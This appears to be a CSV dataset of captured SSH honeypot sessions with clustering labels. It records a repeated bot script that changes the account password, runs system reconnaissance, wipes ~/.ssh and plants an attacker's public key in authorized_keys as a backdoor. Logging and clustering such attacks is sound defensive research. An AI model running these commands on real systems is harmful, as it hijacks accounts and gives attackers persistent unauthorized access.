session,PCKmeans_exp_result,Unnamed: 0,duration,command_freq,input
66a836459b3d,3,13358,16.68023920059204,18,Enter new UNIX password: 
66a836459b3d,3,13359,16.68023920059204,18,Enter new UNIX password:
66a836459b3d,3,13360,16.68023920059204,18,"echo ""yms\n89DOwgBcXach\n89DOwgBcXach\n""|passwd"
66a836459b3d,3,13361,16.68023920059204,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
66a836459b3d,3,13362,16.68023920059204,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
66a836459b3d,3,13363,16.68023920059204,18,ls -lh $(which ls)
66a836459b3d,3,13364,16.68023920059204,18,which ls
66a836459b3d,3,13365,16.68023920059204,18,crontab -l
66a836459b3d,3,13366,16.68023920059204,18,w
66a836459b3d,3,13367,16.68023920059204,18,uname -m
66a836459b3d,3,13368,16.68023920059204,18,cat /proc/cpuinfo | grep model | grep name | wc -l
66a836459b3d,3,13369,16.68023920059204,18,top
66a836459b3d,3,13370,16.68023920059204,18,uname
66a836459b3d,3,13371,16.68023920059204,18,uname -a
66a836459b3d,3,13372,16.68023920059204,18,lscpu | grep Model
66a836459b3d,3,13373,16.68023920059204,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
46223ef3e44d,3,13374,25.66432309150696,18,cat /proc/cpuinfo | grep name | wc -l
46223ef3e44d,3,13375,25.66432309150696,18,"echo -e ""lawrence123\nMuAXTdPlP1oh\nMuAXTdPlP1oh""|passwd|bash"
46223ef3e44d,3,13376,25.66432309150696,18,Enter new UNIX password: 
46223ef3e44d,3,13377,25.66432309150696,18,Enter new UNIX password:
46223ef3e44d,3,13378,25.66432309150696,18,"echo ""lawrence123\nMuAXTdPlP1oh\nMuAXTdPlP1oh\n""|passwd"
46223ef3e44d,3,13379,25.66432309150696,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
46223ef3e44d,3,13380,25.66432309150696,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
46223ef3e44d,3,13381,25.66432309150696,18,ls -lh $(which ls)
46223ef3e44d,3,13382,25.66432309150696,18,which ls
46223ef3e44d,3,13383,25.66432309150696,18,crontab -l
46223ef3e44d,3,13384,25.66432309150696,18,w
46223ef3e44d,3,13385,25.66432309150696,18,uname -m
46223ef3e44d,3,13386,25.66432309150696,18,cat /proc/cpuinfo | grep model | grep name | wc -l
46223ef3e44d,3,13387,25.66432309150696,18,top
46223ef3e44d,3,13388,25.66432309150696,18,uname
46223ef3e44d,3,13389,25.66432309150696,18,uname -a
46223ef3e44d,3,13390,25.66432309150696,18,lscpu | grep Model
46223ef3e44d,3,13391,25.66432309150696,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
94549e14310e,3,13392,17.28955841064453,18,cat /proc/cpuinfo | grep name | wc -l
94549e14310e,3,13393,17.28955841064453,18,"echo -e ""xiaomi\nyLW89nB4Hd47\nyLW89nB4Hd47""|passwd|bash"
94549e14310e,3,13394,17.28955841064453,18,Enter new UNIX password: 
94549e14310e,3,13395,17.28955841064453,18,Enter new UNIX password:
94549e14310e,3,13396,17.28955841064453,18,"echo ""xiaomi\nyLW89nB4Hd47\nyLW89nB4Hd47\n""|passwd"
94549e14310e,3,13397,17.28955841064453,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
94549e14310e,3,13398,17.28955841064453,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
94549e14310e,3,13399,17.28955841064453,18,ls -lh $(which ls)
94549e14310e,3,13400,17.28955841064453,18,which ls
94549e14310e,3,13401,17.28955841064453,18,crontab -l
94549e14310e,3,13402,17.28955841064453,18,w
94549e14310e,3,13403,17.28955841064453,18,uname -m
94549e14310e,3,13404,17.28955841064453,18,cat /proc/cpuinfo | grep model | grep name | wc -l
94549e14310e,3,13405,17.28955841064453,18,top
94549e14310e,3,13406,17.28955841064453,18,uname
94549e14310e,3,13407,17.28955841064453,18,uname -a
94549e14310e,3,13408,17.28955841064453,18,lscpu | grep Model
94549e14310e,3,13409,17.28955841064453,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
e43f8c85e2f5,3,13410,18.196789264678955,18,cat /proc/cpuinfo | grep name | wc -l
e43f8c85e2f5,3,13411,18.196789264678955,18,"echo -e ""student\nbfjSmE23KYN6\nbfjSmE23KYN6""|passwd|bash"
e43f8c85e2f5,3,13412,18.196789264678955,18,Enter new UNIX password: 
e43f8c85e2f5,3,13413,18.196789264678955,18,Enter new UNIX password:
e43f8c85e2f5,3,13414,18.196789264678955,18,"echo ""student\nbfjSmE23KYN6\nbfjSmE23KYN6\n""|passwd"
e43f8c85e2f5,3,13415,18.196789264678955,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
e43f8c85e2f5,3,13416,18.196789264678955,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
e43f8c85e2f5,3,13417,18.196789264678955,18,ls -lh $(which ls)
e43f8c85e2f5,3,13418,18.196789264678955,18,which ls
e43f8c85e2f5,3,13419,18.196789264678955,18,crontab -l
e43f8c85e2f5,3,13420,18.196789264678955,18,w
e43f8c85e2f5,3,13421,18.196789264678955,18,uname -m
e43f8c85e2f5,3,13422,18.196789264678955,18,cat /proc/cpuinfo | grep model | grep name | wc -l
e43f8c85e2f5,3,13423,18.196789264678955,18,top
e43f8c85e2f5,3,13424,18.196789264678955,18,uname
e43f8c85e2f5,3,13425,18.196789264678955,18,uname -a
e43f8c85e2f5,3,13426,18.196789264678955,18,lscpu | grep Model
e43f8c85e2f5,3,13427,18.196789264678955,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
eea7a2bf1600,3,13428,15.433505058288574,18,cat /proc/cpuinfo | grep name | wc -l
eea7a2bf1600,3,13429,15.433505058288574,18,"echo -e ""test1\nohUpScja6OUP\nohUpScja6OUP""|passwd|bash"
eea7a2bf1600,3,13430,15.433505058288574,18,Enter new UNIX password: 
eea7a2bf1600,3,13431,15.433505058288574,18,Enter new UNIX password:
eea7a2bf1600,3,13432,15.433505058288574,18,"echo ""test1\nohUpScja6OUP\nohUpScja6OUP\n""|passwd"
eea7a2bf1600,3,13433,15.433505058288574,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
eea7a2bf1600,3,13434,15.433505058288574,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
eea7a2bf1600,3,13435,15.433505058288574,18,ls -lh $(which ls)
eea7a2bf1600,3,13436,15.433505058288574,18,which ls
eea7a2bf1600,3,13437,15.433505058288574,18,crontab -l
eea7a2bf1600,3,13438,15.433505058288574,18,w
eea7a2bf1600,3,13439,15.433505058288574,18,uname -m
eea7a2bf1600,3,13440,15.433505058288574,18,cat /proc/cpuinfo | grep model | grep name | wc -l
eea7a2bf1600,3,13441,15.433505058288574,18,top
eea7a2bf1600,3,13442,15.433505058288574,18,uname
eea7a2bf1600,3,13443,15.433505058288574,18,uname -a
eea7a2bf1600,3,13444,15.433505058288574,18,lscpu | grep Model
eea7a2bf1600,3,13445,15.433505058288574,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
04eb2ead330b,3,13446,2.657275915145874,18,cat /proc/cpuinfo | grep name | wc -l
04eb2ead330b,3,13447,2.657275915145874,18,"echo -e ""123\n8DiV8ceg37Tv\n8DiV8ceg37Tv""|passwd|bash"
04eb2ead330b,3,13448,2.657275915145874,18,Enter new UNIX password: 
04eb2ead330b,3,13449,2.657275915145874,18,Enter new UNIX password:
04eb2ead330b,3,13450,2.657275915145874,18,"echo ""123\n8DiV8ceg37Tv\n8DiV8ceg37Tv\n""|passwd"
04eb2ead330b,3,13451,2.657275915145874,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
04eb2ead330b,3,13452,2.657275915145874,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
04eb2ead330b,3,13453,2.657275915145874,18,ls -lh $(which ls)
04eb2ead330b,3,13454,2.657275915145874,18,which ls
04eb2ead330b,3,13455,2.657275915145874,18,crontab -l
04eb2ead330b,3,13456,2.657275915145874,18,w
04eb2ead330b,3,13457,2.657275915145874,18,uname -m
04eb2ead330b,3,13458,2.657275915145874,18,cat /proc/cpuinfo | grep model | grep name | wc -l
04eb2ead330b,3,13459,2.657275915145874,18,top
04eb2ead330b,3,13460,2.657275915145874,18,uname
04eb2ead330b,3,13461,2.657275915145874,18,uname -a
04eb2ead330b,3,13462,2.657275915145874,18,lscpu | grep Model
04eb2ead330b,3,13463,2.657275915145874,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
b768855adfae,3,13464,11.931873321533203,18,cat /proc/cpuinfo | grep name | wc -l
b768855adfae,3,13465,11.931873321533203,18,"echo -e ""dave123\n1bUdimIJFgO2\n1bUdimIJFgO2""|passwd|bash"
b768855adfae,3,13466,11.931873321533203,18,Enter new UNIX password: 
b768855adfae,3,13467,11.931873321533203,18,Enter new UNIX password:
b768855adfae,3,13468,11.931873321533203,18,"echo ""dave123\n1bUdimIJFgO2\n1bUdimIJFgO2\n""|passwd"
b768855adfae,3,13469,11.931873321533203,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
b768855adfae,3,13470,11.931873321533203,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
b768855adfae,3,13471,11.931873321533203,18,ls -lh $(which ls)
b768855adfae,3,13472,11.931873321533203,18,which ls
b768855adfae,3,13473,11.931873321533203,18,crontab -l
b768855adfae,3,13474,11.931873321533203,18,w
b768855adfae,3,13475,11.931873321533203,18,uname -m
b768855adfae,3,13476,11.931873321533203,18,cat /proc/cpuinfo | grep model | grep name | wc -l
b768855adfae,3,13477,11.931873321533203,18,top
b768855adfae,3,13478,11.931873321533203,18,uname
b768855adfae,3,13479,11.931873321533203,18,uname -a
b768855adfae,3,13480,11.931873321533203,18,lscpu | grep Model
b768855adfae,3,13481,11.931873321533203,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
d20fb2429127,3,13482,19.51178359985352,18,cat /proc/cpuinfo | grep name | wc -l
d20fb2429127,3,13483,19.51178359985352,18,"echo -e ""123456\n4xWTiSVZjUe6\n4xWTiSVZjUe6""|passwd|bash"
d20fb2429127,3,13484,19.51178359985352,18,Enter new UNIX password: 
d20fb2429127,3,13485,19.51178359985352,18,Enter new UNIX password:
d20fb2429127,3,13486,19.51178359985352,18,"echo ""123456\n4xWTiSVZjUe6\n4xWTiSVZjUe6\n""|passwd"
d20fb2429127,3,13487,19.51178359985352,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
d20fb2429127,3,13488,19.51178359985352,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
d20fb2429127,3,13489,19.51178359985352,18,ls -lh $(which ls)
d20fb2429127,3,13490,19.51178359985352,18,which ls
d20fb2429127,3,13491,19.51178359985352,18,crontab -l
d20fb2429127,3,13492,19.51178359985352,18,w
d20fb2429127,3,13493,19.51178359985352,18,uname -m
d20fb2429127,3,13494,19.51178359985352,18,cat /proc/cpuinfo | grep model | grep name | wc -l
d20fb2429127,3,13495,19.51178359985352,18,top
d20fb2429127,3,13496,19.51178359985352,18,uname
d20fb2429127,3,13497,19.51178359985352,18,uname -a
d20fb2429127,3,13498,19.51178359985352,18,lscpu | grep Model
d20fb2429127,3,13499,19.51178359985352,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
b0f40254e37c,3,13500,11.4630024433136,18,cat /proc/cpuinfo | grep name | wc -l
b0f40254e37c,3,13501,11.4630024433136,18,"echo -e ""pippo\nKckK6GHqcSDr\nKckK6GHqcSDr""|passwd|bash"
b0f40254e37c,3,13502,11.4630024433136,18,Enter new UNIX password: 
b0f40254e37c,3,13503,11.4630024433136,18,Enter new UNIX password:
b0f40254e37c,3,13504,11.4630024433136,18,"echo ""pippo\nKckK6GHqcSDr\nKckK6GHqcSDr\n""|passwd"
b0f40254e37c,3,13505,11.4630024433136,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
b0f40254e37c,3,13506,11.4630024433136,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
b0f40254e37c,3,13507,11.4630024433136,18,ls -lh $(which ls)
b0f40254e37c,3,13508,11.4630024433136,18,which ls
b0f40254e37c,3,13509,11.4630024433136,18,crontab -l
b0f40254e37c,3,13510,11.4630024433136,18,w
b0f40254e37c,3,13511,11.4630024433136,18,uname -m
b0f40254e37c,3,13512,11.4630024433136,18,cat /proc/cpuinfo | grep model | grep name | wc -l
b0f40254e37c,3,13513,11.4630024433136,18,top
b0f40254e37c,3,13514,11.4630024433136,18,uname
b0f40254e37c,3,13515,11.4630024433136,18,uname -a
b0f40254e37c,3,13516,11.4630024433136,18,lscpu | grep Model
b0f40254e37c,3,13517,11.4630024433136,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
1f5c9da85d9b,3,13518,11.898980617523192,18,cat /proc/cpuinfo | grep name | wc -l
1f5c9da85d9b,3,13519,11.898980617523192,18,"echo -e ""123456\nZQ2XPKVfQ2sW\nZQ2XPKVfQ2sW""|passwd|bash"
1f5c9da85d9b,3,13520,11.898980617523192,18,Enter new UNIX password: 
1f5c9da85d9b,3,13521,11.898980617523192,18,Enter new UNIX password:
1f5c9da85d9b,3,13522,11.898980617523192,18,"echo ""123456\nZQ2XPKVfQ2sW\nZQ2XPKVfQ2sW\n""|passwd"
1f5c9da85d9b,3,13523,11.898980617523192,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
1f5c9da85d9b,3,13524,11.898980617523192,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
1f5c9da85d9b,3,13525,11.898980617523192,18,ls -lh $(which ls)
1f5c9da85d9b,3,13526,11.898980617523192,18,which ls
1f5c9da85d9b,3,13527,11.898980617523192,18,crontab -l
1f5c9da85d9b,3,13528,11.898980617523192,18,w
1f5c9da85d9b,3,13529,11.898980617523192,18,uname -m
1f5c9da85d9b,3,13530,11.898980617523192,18,cat /proc/cpuinfo | grep model | grep name | wc -l
1f5c9da85d9b,3,13531,11.898980617523192,18,top
1f5c9da85d9b,3,13532,11.898980617523192,18,uname
1f5c9da85d9b,3,13533,11.898980617523192,18,uname -a
1f5c9da85d9b,3,13534,11.898980617523192,18,lscpu | grep Model
1f5c9da85d9b,3,13535,11.898980617523192,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
0e498435408e,3,13536,16.037297248840332,18,cat /proc/cpuinfo | grep name | wc -l
0e498435408e,3,13537,16.037297248840332,18,"echo -e ""intro1\nZrkBTM1P7mKU\nZrkBTM1P7mKU""|passwd|bash"
0e498435408e,3,13538,16.037297248840332,18,Enter new UNIX password: 
0e498435408e,3,13539,16.037297248840332,18,Enter new UNIX password:
0e498435408e,3,13540,16.037297248840332,18,"echo ""intro1\nZrkBTM1P7mKU\nZrkBTM1P7mKU\n""|passwd"
0e498435408e,3,13541,16.037297248840332,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
0e498435408e,3,13542,16.037297248840332,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
0e498435408e,3,13543,16.037297248840332,18,ls -lh $(which ls)
0e498435408e,3,13544,16.037297248840332,18,which ls
0e498435408e,3,13545,16.037297248840332,18,crontab -l
0e498435408e,3,13546,16.037297248840332,18,w
0e498435408e,3,13547,16.037297248840332,18,uname -m
0e498435408e,3,13548,16.037297248840332,18,cat /proc/cpuinfo | grep model | grep name | wc -l
0e498435408e,3,13549,16.037297248840332,18,top
0e498435408e,3,13550,16.037297248840332,18,uname
0e498435408e,3,13551,16.037297248840332,18,uname -a
0e498435408e,3,13552,16.037297248840332,18,lscpu | grep Model
0e498435408e,3,13553,16.037297248840332,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
a8029ba95f27,3,13554,13.892935037612917,18,cat /proc/cpuinfo | grep name | wc -l
a8029ba95f27,3,13555,13.892935037612917,18,"echo -e ""654321\nL0KeSRyW1k8Y\nL0KeSRyW1k8Y""|passwd|bash"
a8029ba95f27,3,13556,13.892935037612917,18,Enter new UNIX password: 
a8029ba95f27,3,13557,13.892935037612917,18,Enter new UNIX password:
a8029ba95f27,3,13558,13.892935037612917,18,"echo ""654321\nL0KeSRyW1k8Y\nL0KeSRyW1k8Y\n""|passwd"
a8029ba95f27,3,13559,13.892935037612917,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
a8029ba95f27,3,13560,13.892935037612917,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
a8029ba95f27,3,13561,13.892935037612917,18,ls -lh $(which ls)
a8029ba95f27,3,13562,13.892935037612917,18,which ls
a8029ba95f27,3,13563,13.892935037612917,18,crontab -l
a8029ba95f27,3,13564,13.892935037612917,18,w
a8029ba95f27,3,13565,13.892935037612917,18,uname -m
a8029ba95f27,3,13566,13.892935037612917,18,cat /proc/cpuinfo | grep model | grep name | wc -l
a8029ba95f27,3,13567,13.892935037612917,18,top
a8029ba95f27,3,13568,13.892935037612917,18,uname
a8029ba95f27,3,13569,13.892935037612917,18,uname -a
a8029ba95f27,3,13570,13.892935037612917,18,lscpu | grep Model
a8029ba95f27,3,13571,13.892935037612917,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
05913e465ec8,3,13572,15.441880226135254,18,cat /proc/cpuinfo | grep name | wc -l
05913e465ec8,3,13573,15.441880226135254,18,"echo -e ""Password\nIPQUdEHcAACE\nIPQUdEHcAACE""|passwd|bash"
